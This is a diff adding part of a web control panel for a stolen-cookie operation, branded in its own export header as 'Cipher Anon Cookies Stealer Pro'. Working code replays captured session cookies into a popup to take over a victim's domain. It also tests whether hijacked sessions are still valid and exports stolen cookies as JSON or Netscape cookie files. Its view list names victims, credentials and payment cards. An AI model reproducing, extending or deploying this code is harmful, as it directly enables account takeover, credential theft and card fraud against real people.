+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;}
+</style></head><body>
+<div class="s"></div>
+<p>Loading <strong>${domain}</strong>...</p>
+<script>
+    const cookies = ${JSON.stringify(cookies)};
+    let count = 0;
+    Object.entries(cookies).forEach(([name, value]) => {
+        try { document.cookie = name + '=' + value + '; domain=.${domain}; path=/'; count++; } catch(e) {}
+    });
+    setTimeout(() => window.location.href = 'https://' + '${domain}', 1500);
+<\/script>
+</body></html>
+`);
+win.document.close();
+showToast('▶️ Replay started', 'success');
+}
+
+function replayFromModal() {
+if (currentModalDomain) replaySession(currentModalDomain);
+}
+
+async function testSession(domain) {
+let cookies = {};
+allData.forEach(entry => {
+const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+Object.assign(cookies, entry.cookies || {});
+}
+});
+
+if (Object.keys(cookies).length === 0) {
+showToast('❌ No cookies found', 'error');
+return;
+}
+
+const btn = event?.target;
+if (btn) { btn.textContent = '⏳'; btn.style.opacity = '0.6'; }
+
+try {
+const result = await testSessionViaFetch(domain);
+const resultMsg = document.getElementById('testResultModal');
+if (resultMsg) {
+resultMsg.className = 'test-result show ' + (result.valid ? 'valid' : 'invalid');
+resultMsg.textContent = result.message;
+}
+showToast(result.message, result.valid ? 'success' : 'error');
+} catch(e) {
+const resultMsg = document.getElementById('testResultModal');
+if (resultMsg) {
+resultMsg.className = 'test-result show invalid';
+resultMsg.textContent = '⚠️ Test failed';
+}
+}
+if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; }
+}
+
+function testSessionViaFetch(domain) {
+return new Promise((resolve) => {
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.src = `https://${domain}`;
+let resolved = false;
+const timeout = setTimeout(() => {
+if (!resolved) { resolved = true; document.body.removeChild(iframe); resolve({ valid: false, message: `⏱️ ${domain} — Timed out` }); }
+}, 10000);
+iframe.onload = function() {
+if (!resolved) { resolved = true; clearTimeout(timeout); document.body.removeChild(iframe); resolve({ valid: true, message: `✅ ${domain} — Valid` }); }
+};
+iframe.onerror = function() {
+if (!resolved) { resolved = true; clearTimeout(timeout); document.body.removeChild(iframe); resolve({ valid: false, message: `❌ ${domain} — Failed` }); }
+};
+document.body.appendChild(iframe);
+});
+}
+
+function testFromModal() {
+if (currentModalDomain) testSession(currentModalDomain);
+}
+
+// ============================================================
+// EXPORT FUNCTIONS
+// ============================================================
+
+function downloadJSON() {
+if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+const url = URL.createObjectURL(blob);
+const a = document.createElement('a');
+a.href = url;
+a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+URL.revokeObjectURL(url);
+showToast('📥 JSON exported', 'success');
+}
+
+function downloadNetscape() {
+if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
+allData.forEach(entry => {
+const cookies = entry.cookies || {};
+const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
+Object.entries(cookies).forEach(([name, value]) => {
+const expiry = Math.floor(Date.now() / 1000) + 31536000;
+lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
+});
+});
+const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+const url = URL.createObjectURL(blob);
+const a = document.createElement('a');
+a.href = url;
+a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+URL.revokeObjectURL(url);
+showToast('📥 Netscape exported', 'success');
+}
+
+// ============================================================
+// LOGOUT
+// ============================================================
+
+function showLogoutConfirm() {
+document.getElementById('logoutConfirmOverlay').classList.add('active');
+}
+
+function hideLogoutConfirm() {
+document.getElementById('logoutConfirmOverlay').classList.remove('active');
+}
+
+function executeLogout() {
+hideLogoutConfirm();
+window.location.href = '/api/logout';
+}
+
+// ============================================================
+// INIT
+// ============================================================
+
+document.addEventListener('DOMContentLoaded', function() {
+    checkSession().then((valid) => {
+        if (!valid) return;
+
+        const navItems = document.querySelectorAll('.sidebar .nav-item[data-view]');
+        navItems.forEach(item => {
+            item.addEventListener('click', function() {
+                const view = this.dataset.view;
+                if (view) switchView(view);
+            });
+        });
+
+        fetchData();
+        fetchTrash();
+        setInterval(() => {
+            if (currentView === 'main') fetchData();
+            else if (currentView === 'trash') fetchTrash();
+            else if (currentView === 'cookies') renderCookiesView();
+            else if (currentView === 'victims') renderVictimsView();
+            else if (currentView === 'creds') renderCredsView();
+            else if (currentView === 'cards') renderCardsView();
+            else if (currentView === 'replay') populateReplayDomains();
+        }, 10000);
+
+        document.getElementById('trashCount').textContent = trashData.length;
+    });
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        closeModal();
+        closeSettings();
+        closeSidebar();
+        hideLogoutConfirm();
+        hideCustomConfirm();
+    }
+});
+
+console.clear();
+</script>
+</body>
+</html>
